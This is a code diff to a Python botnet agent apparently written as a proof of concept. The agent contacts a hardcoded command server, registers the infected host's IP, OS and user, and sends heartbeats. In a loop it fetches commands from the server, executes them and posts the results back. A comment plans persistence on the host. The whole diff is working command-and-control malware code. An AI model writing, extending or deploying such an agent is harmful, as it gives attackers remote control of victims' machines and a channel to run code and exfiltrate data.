@@ -12,6 +12,10 @@ TODO: Create a builder script which creates this agent script
 with specific configurations.
 
 TODO2: Create error checking for checking in with the server 
+
+TODO2-1: Upon three failure of heartbeat ("No such bot response"), 
+try re-register 
+
 TODO3: Create persistence on the script itself. 
 """
 # Need to have hardcoded server ip address 
@@ -33,7 +37,18 @@ def get_ip():
 
         return IP 
 
-def heartbeat():
+def heartbeat(ip, user):
+    url = URL + '/heartbeat'
+
+    data = {'ip': ip, 'user': user}
+
+    try:
+        res = requests.post(url, data=data)
+        return res.text
+    except Exception as e:
+        pass 
+
+def firstcontact():
     url = URL + '/firstcontact'
 
     data = {'firstcontactkey': FIRSTCONTACTKEY}
@@ -52,6 +67,12 @@ def register(ip, os, user):
     data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os, 'user': user}
 
     res = requests.post(url,data=data)
+
+    data = res.json()
+
+    if 'error' in data:
+        exit()
+
 
     #return REGISTERKEY
 
@@ -106,28 +127,29 @@ def main():
         print("[-] Unidentifiable OS type")
 
     ip = get_ip()
-    #heartbeat()
-    #register(ip,host_os,user)
+    firstcontact()
+    register(ip,host_os,user)
     
     while(1): 
-        heartbeat()
-        register(ip, host_os, user)
 
-        result = fetchexec(ip)
+        beat = heartbeat(ip, user)
+        if beat is not None:
 
-        # If server response that the bot doesn't have anything, just sleep.
-        if isinstance(result, str) and '[-]' in result:
-            print("[-] Sleeping...")
-            time.sleep(10)
-            continue
+            result = fetchexec(ip)
 
-        print("[DEBUG] Result:", result)
-        submit_result(ip, result)
+            # If server response that the bot doesn't have anything, just sleep.
+            if isinstance(result, str) and '[-]' in result:
+                print("[-] Sleeping...")
+                time.sleep(10)
+                continue
 
-        print("[+] Command feteched and executed. Sleeping ... ")
-        
-        # This is for production. For PoC, just sleep for 10 seconds.
-        #timerandom = random.randint(10,20)
+            print("[DEBUG] Result:", result)
+            submit_result(ip, result)
+
+            print("[+] Command feteched and executed. Sleeping ... ")
+            
+            # This is for production. For PoC, just sleep for 10 seconds.
+            #timerandom = random.randint(10,20)
         
         time.sleep(10)
 
